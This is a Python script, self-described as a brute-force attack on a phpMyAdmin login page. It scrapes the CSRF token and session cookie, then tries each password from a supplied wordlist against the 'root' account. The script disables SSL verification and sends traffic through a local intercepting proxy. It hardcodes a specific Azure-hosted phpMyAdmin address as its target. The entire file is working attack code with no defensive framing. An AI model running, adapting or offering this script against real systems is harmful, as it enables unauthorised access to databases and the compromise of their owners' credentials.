import requests
import warnings
import urllib3
import re
import argparse

# Disable SSL warnings
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)

url = 'https://learningcenter-dev.azurewebsites.net/phpmyadmin/index.php?'
proxies = {'http': 'http://127.0.0.1:8080'}

# ANSI escape codes for color formatting
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'

def login(password):
    # Make GET request to obtain the page content and cookies
    response = requests.get(url, proxies=proxies, verify=False)
    page_content = response.text
    cookies = response.cookies

    # Extract the set_session value from cookies
    set_session_value = None
    for key, value in cookies.items():
        if key.startswith('phpMyAdmin_https'):
            set_session_value = value
            break


    # Extract the token value using regex
    token_regex = r'<input type="hidden" name="token" value="(.+?)">'
    match = re.search(token_regex, page_content)
    if match:
        token = match.group(1)
    else:
        print("Token not found.")
        return

    # Prepare the POST data with the token, set_session, and password
    data = {
        'route': '/',
        'lang': 'en',
        'token': token,
        'set_session': set_session_value,
        'pma_username': 'root',
        'pma_password': password,
        'server': '1'
    }

    # Make the POST request with the cookies from the GET request
    post_response = requests.post(url, proxies=proxies, data=data, cookies=cookies, verify=False)

    # Process the response as needed
    if "Cannot log in to the MySQL server" not in post_response.text:
        print(GREEN + "Success - Password found: " + password + ENDC)
        return True
    else:
        print(RED + "Failed - Password attempted: " + password + ENDC)
        return False

def main():
    parser = argparse.ArgumentParser(description='Brute-force attack on phpMyAdmin login using a list of passwords.')
    parser.add_argument('-passwords', help='Path to the file containing the list of passwords.')
    args = parser.parse_args()

    if args.passwords:
        password_file = args.passwords

        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f]

        for password in passwords:
            if login(password):
                break

if __name__ == '__main__':
    main()

